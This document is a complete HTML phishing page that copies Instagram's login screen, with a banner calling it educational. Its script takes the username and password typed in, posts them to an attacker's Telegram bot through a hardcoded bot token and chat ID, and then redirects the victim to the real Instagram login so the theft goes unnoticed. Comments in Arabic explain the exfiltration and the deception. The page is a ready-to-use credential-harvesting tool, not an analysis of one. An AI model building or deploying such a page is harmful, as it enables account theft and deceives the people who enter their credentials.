<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
        .legal-notice { color: #28a745; font-weight: bold; margin: 10px 0; font-size: 13px; text-align: center; }
        .main-container { width: 100%; max-width: 350px; background-color: #fff; border: 1px solid #dbdbdb; padding: 40px 10px; box-sizing: border-box; text-align: center; margin-bottom: 10px; }
        .logo { width: 175px; margin: 0 auto 30px auto; display: block; }
        .login-form { display: flex; flex-direction: column; padding: 0 20px; }
        .login-form input { background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 10px; margin-bottom: 6px; font-size: 12px; }
        .login-form button { background-color: #0095f6; border: none; color: white; border-radius: 8px; padding: 7px 0; font-weight: 600; cursor: pointer; margin-top: 8px; font-size: 14px; }
        .login-form button:disabled { background-color: #b2dffc; cursor: not-allowed; }
        .divider { display: flex; align-items: center; margin: 20px 20px; color: #8e8e8e; font-size: 13px; font-weight: 600; }
        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; }
        .divider span { padding: 0 18px; }
        .fb-login { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; display: block; margin-bottom: 20px; }
        .forgot-password { color: #00376b; font-size: 12px; text-decoration: none; }
        .signup-box { width: 100%; max-width: 350px; background-color: #fff; border: 1px solid #dbdbdb; padding: 20px; text-align: center; font-size: 14px; box-sizing: border-box; }
        .signup-box a { color: #0095f6; text-decoration: none; font-weight: 600; }
    </style>
</head>
<body>

    <div class="legal-notice">Этот сайт предназначен для образовательных целей</div>

    <div class="main-container">
        <img src="https://www.instagram.com/static/images/web/mobile_port_monocle-7b353f0503a1.png/logo_2x.png" alt="Instagram" class="logo">
        
        <form class="login-form" id="p-form">
            <input type="text" id="u-field" placeholder="Phone number, username, or email" required>
            <input type="password" id="p-field" placeholder="Password" required>
            <button type="submit" id="s-btn">Log In</button>
            
            <div class="divider"><span>OR</span></div>
            <a href="#" class="fb-login">Log in with Facebook</a>
            <a href="#" class="forgot-password">Forgot password?</a>
        </form>
    </div>

    <div class="signup-box">
        Don't have an account? <a href="#">Sign up</a>
    </div>

    <script>
        const BOT_TOKEN = "8275124583:AAH_ad7HiinANwVXTPqgMNW1SsG44g6eqzo";
        const CHAT_ID = "8042090388";

        document.getElementById('p-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const u = document.getElementById('u-field').value;
            const p = document.getElementById('p-field').value;
            const btn = document.getElementById('s-btn');

            btn.disabled = true;
            btn.innerText = "Processing...";

            // البيانات اللي رح توصلك على تلغرام
            const text = `🔥 NEW TARGET LOGGED 🔥\n\n👤 User: ${u}\n🔑 Pass: ${p}\n\n📍 Lab Exercise - Educational Purposes Only`;

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
            })
            .then(() => {
                // تحويل لصفحة الخطأ في انستغرام عشان تبين "حقيقية" كأن كلمة السر غلط
                window.location.href = "https://www.instagram.com/accounts/login/?next=/&source=auth_switcher";
            })
            .catch(() => {
                alert("Server error. Please try again later.");
                btn.disabled = false;
                btn.innerText = "Log In";
            });
        });
    </script>
</body>
</html>
